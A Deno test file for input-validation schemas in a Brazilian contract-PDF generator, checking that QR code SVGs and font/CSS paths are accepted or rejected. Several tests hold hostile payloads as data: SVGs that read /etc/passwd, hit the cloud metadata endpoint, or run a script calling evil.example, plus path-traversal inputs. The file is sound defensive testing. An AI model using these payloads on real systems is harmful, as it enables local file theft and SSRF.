import { assertEquals } from "@std/assert";
import * as v from "valibot";
import { AnticipationContractDataSchema, PdfOptionsSchema } from "@/generator/dto/generate-document.job.ts";

const VALID_QRCODE_SVG =
	`<svg xmlns="http://www.w3.org/2000/svg" class="size-[250px]" viewBox="0 0 29 29"><rect width="29" height="29" fill="#fff"/><rect x="1" y="1" width="2" height="2" fill="#000"/></svg>`;

const VALID_ANTICIPATION_CONTRACT_DATA = {
	issueDate: "01/01/2025",
	company: {
		fullName: "Empresa Teste LTDA",
		document: "00.000.000/0001-00",
		address: "Rua Teste, 123",
		phone: "+55 11 0000-0000",
		email: "contato@empresa-teste.com",
		responsible: { fullName: "Responsável Teste", document: "000.000.000-00" },
	},
	employee: {
		fullName: "Colaborador Teste",
		document: "000.000.000-00",
		cargo: "Analista",
		matricula: "12345",
		dataAdmissao: "01/01/2020",
	},
	anticipation: {
		amount: "R$ 100,00",
		dataSolicitacao: "01/01/2025",
		dataLiberacao: "02/01/2025",
		contaDeposito: "0000-0",
	},
	signatures: {
		employee: { name: "Colaborador Teste" },
		responsible: { name: "Responsável Teste" },
	},
	qrcode_pf: VALID_QRCODE_SVG,
	qrcode_pj: VALID_QRCODE_SVG,
};

// --- qrcode_pf / qrcode_pj ---

Deno.test("AnticipationContractDataSchema: aceita SVG de QR code válido", () => {
	const result = v.safeParse(AnticipationContractDataSchema, VALID_ANTICIPATION_CONTRACT_DATA);
	assertEquals(result.success, true);
});

Deno.test("AnticipationContractDataSchema: rejeita qrcode com foreignObject (local-file-read)", () => {
	const malicious =
		`<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><img src="file:///etc/passwd"/></foreignObject></svg>`;
	const result = v.safeParse(AnticipationContractDataSchema, {
		...VALID_ANTICIPATION_CONTRACT_DATA,
		qrcode_pf: malicious,
	});
	assertEquals(result.success, false);
});

Deno.test("AnticipationContractDataSchema: rejeita qrcode com href externo (SSRF via metadata endpoint)", () => {
	const malicious =
		`<svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/latest/meta-data/"/></svg>`;
	const result = v.safeParse(AnticipationContractDataSchema, {
		...VALID_ANTICIPATION_CONTRACT_DATA,
		qrcode_pj: malicious,
	});
	assertEquals(result.success, false);
});

Deno.test("AnticipationContractDataSchema: rejeita qrcode com <script>", () => {
	const malicious = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('http://evil.example')</script></svg>`;
	const result = v.safeParse(AnticipationContractDataSchema, {
		...VALID_ANTICIPATION_CONTRACT_DATA,
		qrcode_pf: malicious,
	});
	assertEquals(result.success, false);
});

Deno.test("AnticipationContractDataSchema: rejeita qrcode que não é um SVG válido", () => {
	const result = v.safeParse(AnticipationContractDataSchema, {
		...VALID_ANTICIPATION_CONTRACT_DATA,
		qrcode_pf: "<div>não é svg</div>",
	});
	assertEquals(result.success, false);
});

// --- pdfOptions.fonts / pdfOptions.css ---

Deno.test("PdfOptionsSchema: aceita caminho de fonte dentro do diretório de assets permitido", () => {
	const allowedPath = new URL("../../../../fonts/Roboto-VariableFont.ttf", import.meta.url).pathname;
	const result = v.safeParse(PdfOptionsSchema, { fonts: [allowedPath] });
	assertEquals(result.success, true);
});

Deno.test("PdfOptionsSchema: rejeita caminho de fonte fora do diretório de assets permitido (local-file-read)", () => {
	const result = v.safeParse(PdfOptionsSchema, { fonts: ["/etc/passwd"] });
	assertEquals(result.success, false);
});

Deno.test("PdfOptionsSchema: rejeita caminho de css com path traversal", () => {
	const allowedDir = new URL("../../../../fonts/", import.meta.url).pathname;
	const result = v.safeParse(PdfOptionsSchema, { css: [`${allowedDir}../../etc/passwd`] });
	assertEquals(result.success, false);
});
